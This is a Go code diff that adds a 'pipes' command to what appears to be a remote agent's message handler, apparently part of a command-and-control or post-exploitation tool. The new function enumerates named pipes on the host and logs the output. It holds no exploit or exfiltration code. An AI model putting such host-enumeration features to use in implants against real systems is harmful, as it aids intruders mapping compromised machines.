@@ -1104,6 +1104,8 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 					c.Stderr = fmt.Sprintf("Server can't find: %s\n", query)
 				}
 			}
+		case "pipes":
+			c.Stdout, c.Stderr = a.pipes()
 		case "ps":
 			c.Stdout, c.Stderr = a.ps()
 		case "pwd":
@@ -1291,6 +1293,29 @@ func (a *Agent) ifconfig() (stdout string, stderr string) {
 	if a.Verbose {
 		if stderr != "" {
 			message("warn", fmt.Sprintf("There was an error executing ifconfig"))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", stdout)
+		}
+	}
+	return stdout, stderr
+}
+
+// Functionality is split between Windows and non-windows because extra API calls need to be made
+func (a *Agent) pipes() (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Running pipes function"))
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing pipes function"))
+	}
+
+	stdout, stderr = Pipes()
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error enumerating pipes"))
 			message("success", stdout)
 			message("warn", fmt.Sprintf("Error: %s", stderr))
 
